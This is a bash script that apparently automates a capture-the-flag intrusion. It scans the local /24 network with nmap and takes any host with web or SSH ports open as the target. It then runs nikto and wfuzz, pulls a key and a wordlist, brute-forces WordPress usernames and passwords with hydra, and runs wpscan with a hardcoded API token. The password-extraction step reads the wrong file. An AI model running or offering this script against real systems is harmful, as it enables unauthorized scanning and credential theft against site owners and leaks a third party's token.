#!/bin/bash

echo "eliyahu"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
# IP finding
myIP=$(ifconfig | grep broadcast | cut -d " " -f 10)
echo "My IP: $myIP"

myNetmask=$(ifconfig | grep broadcast | cut -d " " -f 13)
echo "Netmask: $myNetmask"

getNetwork() {
  local ipAddress="$1"
  local subnetMask="$2"
  IFS="."
  read -r -a ip <<< "$ipAddress"
  read -r -a mask <<< "$subnetMask"

  local network="${ip[0] & mask[0]}.${ip[1] & mask[1]}.${ip[2] & mask[2]}.${ip[3] & mask[3]}"

  echo "$network"
}

myNetwork=$(getNetwork "$myIP" "$myNetmask")
echo "Network: $myNetwork"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

echo "Running network scan"

# Divide by 24 because netmask is 255.255.255.0
nmap "$myNetwork/24"
targetIP=$(nmap -p 22,80,443 --open "$myNetwork/24" | grep report | cut -d " " -f 5)

echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

echo "Target IP: $targetIP"

echo "Running vulnerability scan"
nikto -h "$targetIP"

echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

echo "Running wfuzz"
wfuzz -c -z file,/SecLists/Discovery/Web-Content/raft-small-files.txt --hc 404,402,429 "http://$targetIP/FUZZ"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

echo "Running wfuzz to discover web directories"
wfuzz -c -z file,/SecLists/Discovery/Web-Content/raft-small-directories.txt --hc 404,402,429 "http://$targetIP/FUZZ/"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

echo "Fetching robots.txt"
curl "$targetIP/robots.txt"

echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

key1=$(curl "$targetIP/key-1-of-3")
echo "Key 1: $key1"

curl "$targetIP/dictionary.txt" > target_dictionary.txt

sort target_dictionary.txt > sorted_dictionary.txt

uniq sorted_dictionary.txt > unique_sorted_dictionary.txt

echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

echo "Sorted and unique target_dictionary.txt:"
sleep 5
cat unique_sorted_dictionary.txt

echo "Running hydra to discover wp-login username"
hydra -L unique_sorted_dictionary.txt -p something "$targetIP" http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In F:Invalid username" | tee hydra_user.txt

echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

wpUsers=$(grep "something" hydra_user.txt | cut -d ' ' -f 7)
echo "$wpUsers" > users.txt
wpUsername=$(head -n 1 users.txt)

hydra -l "$wpUsername" -P unique_sorted_dictionary.txt "$targetIP" http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In F:The password" | tee hydra_password.txt
echo "The password is:"
wpPassword=$(grep "$wpUsername" hydra_user.txt | cut -d ' ' -f 11)

echo "Results:"
echo "WordPress username: $wpUsername"
echo "WordPress password: $wpPassword"

echo "Running wpscan"
wpscan --url "$targetIP" --enumerate --api-token 5Hl7ptAcy1UOwnPmhRNfxpPKNYwHG5Gv8j9cJwBfP8Q
